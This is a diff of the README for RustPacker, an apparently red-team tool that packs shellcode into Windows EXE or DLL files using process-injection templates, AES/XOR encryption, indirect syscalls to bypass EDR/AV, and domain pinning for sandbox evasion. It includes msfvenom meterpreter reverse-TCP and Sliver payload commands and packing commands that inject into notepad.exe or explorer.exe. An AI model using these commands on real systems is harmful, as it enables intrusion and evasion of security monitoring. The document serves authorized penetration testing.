@@ -11,10 +11,11 @@ RustPacker is a template-based shellcode packer designed for penetration testers
 ### ✨ Key Features
 
 - **Multiple Injection Templates**: Choose from various injection techniques (CRT, APC, Fibers, etc.)
-- **Encryption Support**: XOR and AES encryption for payload obfuscation
+- **Encryption Support**: XOR and AES-256 encryption for payload obfuscation
 - **Syscall Evasion**: Indirect syscalls to bypass EDR/AV detection
 - **Flexible Output**: Generate both EXE and DLL files
-- **Cross-Platform**: Works on any OS with Docker/Podman support
+- **Sandbox Evasion**: Domain pinning to prevent detonation in analysis environments
+- **Cross-Platform Build**: Works on any OS with Docker/Podman support
 - **Framework Compatible**: Works with Metasploit, Sliver, and custom shellcode
 
 ## 🚀 Quick Start
@@ -39,18 +40,40 @@ podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPac
   -e aes \
   -b exe \
   -t notepad.exe
+```
 
-# Find your packed binary in shared/output_[RANDOM_NAME]/target/x86_64-pc-windows-gnu/release/
+The compiled binary is located in `shared/output_<timestamp>/target/x86_64-pc-windows-gnu/release/` with a randomized filename. The exact path is printed at the end of the output:
+
+```
+[+] Source binary has been renamed to: "shared/output_1234567890/target/x86_64-pc-windows-gnu/release/AbCdEfGh.exe"
 ```
 
 ### Create an Alias for Convenience
 
 ```bash
-# Linux/macOS
 alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'
 
 # Now you can use it simply:
 rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
+```
+
+## 📖 Command Line Options
+
+```
+Usage: RustPacker -f <FILE> -b <FORMAT> -i <TEMPLATE> -e <ENCRYPTION> [OPTIONS]
+
+Required:
+  -f <FILE>         Path to the raw shellcode file
+  -i <TEMPLATE>     Injection template: ntapc, ntcrt, syscrt, wincrt, winfiber, ntfiber, sysfiber
+  -e <ENCRYPTION>   Encryption method: xor, aes
+  -b <FORMAT>       Output binary format: exe, dll
+
+Optional:
+  -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
+  -s <DOMAIN>       Domain pinning: only execute on the specified domain name
+  -o <PATH>         Custom output path for the resulting binary
+  -h                Print help
+  -V                Print version
 ```
 
 ## 📋 Usage Examples
@@ -59,54 +82,76 @@ rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
 
 **Metasploit (msfvenom):**
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o payload.raw
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o shared/payload.raw
 ```
 
 **Sliver:**
 ```bash
 # In Sliver console
 generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
+# Then copy the generated .bin file to the shared/ folder
 ```
 
 ### Packing Examples
 
-**Basic EXE with AES encryption:**
+**Basic EXE with AES encryption (remote injection into notepad):**
 ```bash
 rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
 ```
 
-**DLL with XOR encryption:**
+**DLL with XOR encryption (self-injection via APC):**
 ```bash
 rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
 ```
 
-**Custom output location:**
+**Using indirect syscalls (remote injection into explorer):**
 ```bash
-rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -o shared/custom_name.exe
+rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
+```
+
+**With domain pinning (only detonates on MYDOMAIN):**
+```bash
+rustpacker -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
+```
+
+**Custom output path:**
+```bash
+rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
 ```
 
 ## 🛠️ Available Templates
 
-| Template | Description | Injection Method | Syscalls |
-|----------|-------------|------------------|----------|
-| `wincrt` | High-level Windows API injection | Remote Process | ❌ |
-| `ntcrt` | Low-level NT API injection | Remote Process | ❌ |
-| `syscrt` | Indirect syscalls injection | Remote Process | ✅ |
-| `ntapc` | APC-based execution | New Process | ❌ |
-| `winfiber` | Fiber-based execution | Current Process | ❌ |
-| `ntfiber` | NT API + Fiber execution | Current Process | ❌ |
-| `sysfiber` | Indirect syscalls + Fiber execution | Current Process | ✅ |
+### Process Injection Templates
 
-### Template Details
+These templates inject shellcode into a remote process. Use `-t <process_name>` to specify the target (default: `dllhost.exe`). The target process name is **case sensitive**.
 
-**Process Injection Templates:**
-- Use with `-t <process_name>` to specify target process
-- Default target: `dllhost.exe`
-- Compatible with: `wincrt`, `ntcrt`, `syscrt`
+| Template | API Level | Indirect Syscalls | Description |
+|----------|-----------|:-----------------:|-------------|
+| `wincrt` | High (Windows-rs) | ❌ | CreateRemoteThread via the official Windows crate |
+| `ntcrt` | Low (ntapi) | ❌ | NtCreateThreadEx via NT native API |
+| `syscrt` | Syscall | ✅ | NtCreateThreadEx via indirect syscalls |
 
-**Self-Execution Templates:**
-- Execute shellcode within the packed binary
-- Compatible with: `ntapc`, `winfiber`, `ntfiber`, `sysfiber`
+### Self-Execution Templates
+
+These templates execute shellcode within the current process. No target process needed.
+
+| Template | API Level | Indirect Syscalls | Description |
+|----------|-----------|:-----------------:|-------------|
+| `ntapc` | Low (ntapi) | ❌ | Queue APC to current thread, trigger with NtTestAlert |
+| `winfiber` | High (windows-sys) | ❌ | Fiber-based execution via Windows API |
+| `ntfiber` | Low (ntapi + windows-sys) | ❌ | Fiber-based execution via NT native API |
+| `sysfiber` | Syscall (ntapi + windows-sys) | ✅ | Fiber-based execution via indirect syscalls |
+
+## 🔒 Detection Evasion
+
+RustPacker implements several evasion techniques:
+
+- **Indirect Syscalls**: Bypass user-mode hooks (`syscrt`, `sysfiber` templates)
+- **Payload Encryption**: XOR encoding or AES-256-CBC encryption
+- **Process Injection**: Hide execution in legitimate processes
+- **Domain Pinning**: Only detonate on a specific domain (sandbox evasion)
+- **Template Variety**: Multiple execution methods to avoid static signatures
+- **Rust Compilation**: Native binaries with stripped symbols and LTO
 
 ## ⚙️ Local Installation
 
@@ -131,33 +176,6 @@ cd RustPacker/
 cargo run -- -f shared/payload.raw -i ntcrt -e xor -b exe -t explorer.exe
 ```
 
-## 📖 Command Line Options
-
-```
-RustPacker [OPTIONS]
-
-OPTIONS:
-    -f, --file <FILE>           Input shellcode file (raw format)
-    -i, --injection <TEMPLATE>  Injection template [wincrt|ntcrt|syscrt|ntapc|winfiber|ntfiber|sysfiber]
-    -e, --encryption <TYPE>     Encryption method [xor|aes]
-    -b, --binary <TYPE>         Output binary type [exe|dll]
-    -t, --target <PROCESS>      Target process name (for injection templates)
-    -s, --sandbox <DOMAIN>      Sandbox Domain Pinning (detonate only on specified domain)
-    -o, --output <PATH>         Custom output path and filename
-    -h, --help                  Print help information
-    -V, --version               Print version information
-```
-
-## 🔒 Detection Evasion
-
-RustPacker implements several evasion techniques:
-
-- **Indirect Syscalls**: Bypass user-mode hooks (syscrt, sysfiber templates)
-- **Encryption**: XOR and AES payload encryption
-- **Process Injection**: Hide execution in legitimate processes
-- **Template Variety**: Multiple execution methods to avoid signatures
-- **Rust Compilation**: Native binaries with reduced detection surface
-
 ## 🐳 Why Podman over Docker?
 
 We recommend using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/):
@@ -181,9 +199,9 @@ Contributions are welcome! Here's how you can help:
 - [x] Indirect syscalls support
 - [x] EXE and DLL output formats
 - [x] Docker containerization
-- [x] Domain pining, thanks to [m4r1u5-p0p](https://github.com/m4r1u5-p0p) !
+- [x] Domain pinning, thanks to [m4r1u5-p0p](https://github.com/m4r1u5-p0p) !
+- [x] Indirect syscalls for fiber templates
 - [ ] String encryption (litcrypt)
-- [ ] Sandbox evasion techniques
 - [ ] Binary signing support
 - [ ] Mutex/Semaphore support
 
@@ -199,7 +217,7 @@ Contributions are welcome! Here's how you can help:
 
 **⚠️ IMPORTANT DISCLAIMER ⚠️**
 
-This tool is provided for **educational and authorized penetration testing purposes only**. 
+This tool is provided for **educational and authorized penetration testing purposes only**.
 
 - Usage against targets without prior mutual consent is **illegal**
 - Users are responsible for complying with all applicable laws
